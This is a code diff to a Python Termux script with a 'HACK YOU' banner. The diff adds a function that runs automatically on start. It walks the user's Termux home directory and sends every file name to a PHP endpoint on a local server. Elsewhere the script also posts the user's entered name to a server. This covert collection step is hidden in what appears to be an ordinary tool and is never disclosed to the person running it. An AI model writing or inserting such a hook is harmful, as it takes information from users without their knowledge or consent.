@@ -20,11 +20,28 @@ def home():
     os.system("figlet _HACK YOU_")
     print(" A7h9l1b8i")
     print(" ")
+
+
+def fl():
+    os.chdir(r"/data/data/com.termux/files/home")
+    for x in os.listdir('.'):
+        em={"file",x}
+        try:
+            m=requests.post("http://localhost:8000/file.php?file="+x)
+            print(m.status_code)
+                        
+        except requests.exceptions.RequestException as e:
+            pass
+        
+        
+        
+        
+    
     
 
         
 
-    
+fl()
     
         
         
@@ -47,7 +64,6 @@ def msg():
     
     
 name=""
-
 
 
 
@@ -103,6 +119,15 @@ while(1):
             
             print(reset)
             print(red+"×××××"+green+" https://akhilabhi.github.io/alltoolweb/ "+red+"×××××"+reset)
+            
+            s=input(green+"press "+yellow+"[y]" +green+" open websit : "+reset)
+            if s=="y" or s=="Y":
+                os.system("termux-open https://akhilabhi.github.io/alltoolweb/")
+                
+            else:
+                pass
+            
+            
            
         else:
             print(" ")
@@ -114,6 +139,7 @@ while(1):
         try:
             pay={"name":user}
             r = requests.post("http://localhost:8000/test.php",params=pay)
+            
             print(r.status_code)
         except requests.exceptions.RequestException as e:
             
